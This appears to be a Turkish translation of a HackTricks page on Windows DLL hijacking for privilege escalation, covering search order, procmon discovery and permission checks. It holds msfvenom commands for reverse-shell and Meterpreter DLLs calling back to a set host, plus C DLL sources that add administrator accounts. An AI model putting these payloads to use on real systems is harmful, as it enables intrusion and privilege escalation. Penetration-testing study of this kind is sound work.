# Dll Korsanlığı

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme becerilerini öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Bize katılın** 💬 [**Discord grubunda**](https://discord.gg/hRep4RUj7f) veya [**telegram grubunda**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Ödül avı ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **ödül avı platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **100.000 $'a kadar ödüller kazanmaya başlayın**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Temel Bilgiler

DLL Korsanlığı, güvenilen bir uygulamanın kötü amaçlı bir DLL yüklemesine manipülasyon yapmayı içerir. Bu terim, **DLL Sahteciliği, Enjeksiyon ve Yan Yükleme** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme amacıyla kullanılır. Buradaki odak ayrıcalık yükseltme olsa da, korsanlığın yöntemi hedeflere göre tutarlı kalır.

### Yaygın Teknikler

DLL korsanlığı için birkaç yöntem kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:

1. **DLL Değiştirme**: Gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirme, isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanma.
2. **DLL Arama Sırası Korsanlığı**: Kötü niyetli DLL'yi meşru olanın önünde bir arama yoluna yerleştirerek, uygulamanın arama desenini sömürme.
3. **Hayalet DLL Korsanlığı**: Bir uygulamanın yüklemesi için bir gereksinim olmayan bir DLL olduğunu düşünerek yüklenmesi için kötü amaçlı bir DLL oluşturma.
4. **DLL Yönlendirme**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` gibi arama parametrelerini değiştirme.
5. **WinSxS DLL Değiştirme**: Meşru bir DLL'yi WinSxS dizinindeki kötü niyetli bir karşılıkla değiştirme, genellikle DLL yan yükleme ile ilişkilendirilen bir yöntem.
6. **Göreceli Yol DLL Korsanlığı**: Kötü niyetli DLL'yi, Kopyalanan uygulama ile kullanıcı tarafından kontrol edilen bir dizine yerleştirerek, Binary Proxy Execution tekniklerini andıran bir yöntem.

## Eksik Dll'leri Bulma

Bir sistem içinde eksik Dll'leri bulmanın en yaygın yolu [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) uygulamasını çalıştırmaktır, **aşağıdaki 2 filtre**yi **ayarlayarak**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

ve sadece **Dosya Sistem Etkinliği'ni** gösterin:

![](<../../.gitbook/assets/image (314).png>)

**Genel olarak eksik dll'leri bulmak** için bunu birkaç **saniye** çalışır bırakabilirsiniz.\
**Belirli bir yürütülebilir içindeki eksik dll'leri arıyorsanız** "İşlem Adı" "içerir" "<yürütülebilir adı>" gibi **başka bir filtre ayarlamanız** gerekmektedir, çalıştırın ve olayları yakalamayı durdurun.

## Eksik Dll'leri Sömürme

Ayrıcalıkları yükseltmek için en iyi şansımız, bir ayrıcalık sürecinin yüklemeye çalışacağı **bir dll yazabilmek** ve **arama yapılacak bir yerde** olmasını sağlamaktır. Bu nedenle, orijinal DLL'nin olduğundan **önce aranacak bir klasöre** kötü niyetli bir DLL yazabileceğiz (garip durum), veya **arama yapılacak bir yere** yazabileceğiz ve orijinal **dll hiçbir klasörde bulunmuyorsa**.

### Dll Arama Sırası

**[Microsoft belgeleri içinde](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) Dll'lerin özellikle nasıl yüklendiğini bulabilirsiniz.**

**Windows uygulamaları**, belirli bir sıraya uyan **önceden tanımlanmış arama yollarını** takip ederek DLL'leri arar. DLL korsanlığı sorunu, zararlı bir DLL'nin stratejik olarak bu dizinlerden birine yerleştirilmesi ve otantik DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'leri belirtirken mutlak yolları kullanmasını sağlamaktır.

32-bit sistemlerde **DLL arama sırasını** aşağıda görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alacak bir işlev yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bu, **App Paths** kaydında belirtilen uygulama özel yolunu içermez. **App Paths** anahtarı, DLL arama yolunu hesaplarken kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda varsayılan arama sırasıdır. Bu özelliği devre dışı bırakmak için **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** ile çağrıldığında, arama **LoadLibraryEx**'in yüklediği yürütülebilir modül dizininde başlar.

Son olarak, **bir dll yalnızca adı yerine mutlak yol belirtilerek yüklenebilir**. Bu durumda, bu dll **yalnızca o yolda aranacak**tır (dll'nin bağımlılıkları varsa, bunlar sadece adıyla aranacaktır).

Arama sırasını değiştirmenin başka yolları da vardır ancak burada açıklamayacağım.
#### Windows belgelerinden dll arama sırasındaki istisnalar

Windows belgelerinde standart DLL arama sırasına belirli istisnalar bulunmaktadır:

* Bellekte zaten yüklenmiş bir DLL ile **adını paylaşan bir DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, yönlendirme ve bir manifest kontrolü yapar ve ardından varsayılan olarak bellekte zaten bulunan DLL'ye geçer. **Bu senaryoda, sistem DLL için bir arama yapmaz**.
* DLL'nin mevcut Windows sürümü için bir **tanınmış DLL** olarak tanındığı durumlarda, sistem tanınmış DLL'nin sürümünü ve bağımlı DLL'lerini kullanır ve **arama sürecini atlar**. **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt anahtarı bu tanınmış DLL'lerin listesini tutar.
* Bir **DLL'nin bağımlılıkları** varsa, bağımlı DLL'lerin araması, başlangıçta DLL'nin tam yolundan tanımlanmış olup olmadığına bakılmaksızın, yalnızca **modül adları** ile belirtildiği gibi yapılır.

### Yetkilerin Yükseltilmesi

**Gereksinimler**:

* **Farklı yetkiler altında çalışan bir işlemi belirleyin veya belirleyin** (yatay veya dikey hareket), **bir DLL'yi eksik olan**.
* **DLL'nin aranacağı herhangi bir dizinde** **yazma erişimi** mevcut olduğundan emin olun. Bu konum, yürütülebilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Evet, gereksinimlerin **varsayılan olarak ayrıcalıklı bir yürütülebilir dosyanın eksik bir dll'ye sahip olması oldukça garip olduğu için zor bulunması** ve hatta **sistem yolunda bir klasöre yazma izinlerine sahip olmanız daha da garip** (varsayılan olarak yapamazsınız). Ancak, yanlış yapılandırılmış ortamlarda bu mümkündür.\
Gereksinimleri karşıladığınızı ve şanslı olduğunuzu bulursanız, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin **ana amacı UAC'yi atlatmak** olsa da, muhtemelen yazma izinlerine sahip olduğunuz bir klasör yolunu değiştirerek kullanabileceğiniz bir Windows sürümü için bir Dll ele geçirme **PoC** bulabilirsiniz.

Bir klasördeki **izinlerinizi kontrol edebilirsiniz** yaparak:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca, bir yürütülebilir dosyanın içe aktarmalarını ve bir dll'nin dışa aktarmalarını şu şekilde kontrol edebilirsiniz:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijacking kötüye kullanarak ayrıcalıkları yükseltme** kılavuzunun tamamı için, **Sistem Yolu klasörüne yazma izinleri** kontrol edin:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem YOLU içinde herhangi bir klasöre yazma izniniz olup olmadığını kontrol edecektir.\
Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar **PowerSploit fonksiyonları**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.

### Örnek

Sömürülebilir bir senaryo bulduğunuzda, başarılı bir şekilde sömürmek için en önemli şeylerden biri, **uygulamanın içe aktaracağı tüm işlevleri en azından dışa aktaran bir dll oluşturmaktır**. Her durumda, Dll Hijacking, [Orta Bütünlük seviyesinden Yüksek **(UAC'yi atlayarak)**'e](../authentication-credentials-uac-and-efs.md#uac) veya [**Yüksek Bütünlük'ten SİSTEM'e**](./#from-high-integrity-to-system)** yükseltmek için kullanışlı olabilir**. **Geçerli bir dll oluşturmanın bir örneğini** bu yürütme için odaklanmış dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde** kullanışlı olabilecek bazı **temel dll kodları** bulabilirsiniz, **şablonlar** oluşturmak veya **gerekli olmayan işlevleri dışa aktaran bir dll oluşturmak** için.

## **Dll Oluşturma ve Derleme**

### **Dll Proxifying**

Temelde bir **Dll proxy**, **yüklendiğinde kötü niyetli kodunuzu yürütebilen ancak aynı zamanda gerçek kütüphaneye tüm çağrıları ileten ve çalışan** bir **Dll'dir**.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracı ile bir uygulamayı belirleyebilir ve proxify yapmak istediğiniz kütüphaneyi seçebilir ve **proxify edilmiş bir dll oluşturabilir** veya bir Dll belirleyebilir ve **proxify edilmiş bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Meterpreter alın (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kullanıcı oluştur (x86 bir sürümü görmedim):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi Dll'iniz

Unutmayın ki birkaç durumda derlediğiniz Dll, kurban süreç tarafından yüklenecek olan birkaç fonksiyonu **ihraç etmelidir**, eğer bu fonksiyonlar mevcut değilse **binary onları yükleyemez** ve **saldırı başarısız olur**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Referanslar

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafından oluşturulan bir premium **hata ödülü platformu**! Bugün bize katılın [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
